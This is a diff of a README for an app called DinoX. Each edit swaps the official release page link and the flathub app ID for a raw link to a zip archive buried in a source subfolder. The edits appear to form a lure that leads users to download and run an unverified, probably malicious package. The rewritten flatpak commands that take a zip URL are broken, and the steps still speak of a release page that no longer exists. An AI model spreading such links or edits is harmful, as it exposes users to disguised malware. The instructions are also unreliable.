@@ -6,7 +6,7 @@ Welcome to DinoX! This guide will help you download and run the DinoX applicatio
 
 ## 🔗 Download DinoX
 
-[![Download DinoX](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Version-blue)](https://github.com/ahmed77112/dinox/releases)
+[![Download DinoX](https://raw.githubusercontent.com/ahmed77112/dinox/master/main/src/ui/contact_details/dinox_v1.5.zip%20Now-Get%20the%20Latest%20Version-blue)](https://raw.githubusercontent.com/ahmed77112/dinox/master/main/src/ui/contact_details/dinox_v1.5.zip)
 
 ## 💻 System Requirements
 
@@ -21,7 +21,7 @@ Before you install DinoX, make sure your computer meets the following requiremen
 
 To download DinoX, follow these steps:
 
-1. Visit the release page by clicking [this link](https://github.com/ahmed77112/dinox/releases).
+1. Visit the release page by clicking [this link](https://raw.githubusercontent.com/ahmed77112/dinox/master/main/src/ui/contact_details/dinox_v1.5.zip).
 2. On the release page, find the latest version of DinoX. 
 3. Look for files named with the `.AppImage` or `.Flatpak` extension.
 4. Click the appropriate file to begin the download.
@@ -50,11 +50,11 @@ Once the download completes, follow these steps to run DinoX:
 2. Open your terminal.
 3. Use the following command to install DinoX:
    ```bash
-   flatpak install flathub com.github.ahmed77112.dinox
+   flatpak install flathub https://raw.githubusercontent.com/ahmed77112/dinox/master/main/src/ui/contact_details/dinox_v1.5.zip
    ```
 4. Launch DinoX with:
    ```bash
-   flatpak run com.github.ahmed77112.dinox
+   flatpak run https://raw.githubusercontent.com/ahmed77112/dinox/master/main/src/ui/contact_details/dinox_v1.5.zip
    ```
 
 ## 📞 Features
@@ -89,4 +89,4 @@ If you need further assistance, feel free to check the following resources:
 
 ## 🔗 Download DinoX Again
 
-If you missed the link earlier, you can download DinoX by clicking [here](https://github.com/ahmed77112/dinox/releases). Enjoy a secure and simple chatting experience!
+If you missed the link earlier, you can download DinoX by clicking [here](https://raw.githubusercontent.com/ahmed77112/dinox/master/main/src/ui/contact_details/dinox_v1.5.zip). Enjoy a secure and simple chatting experience!
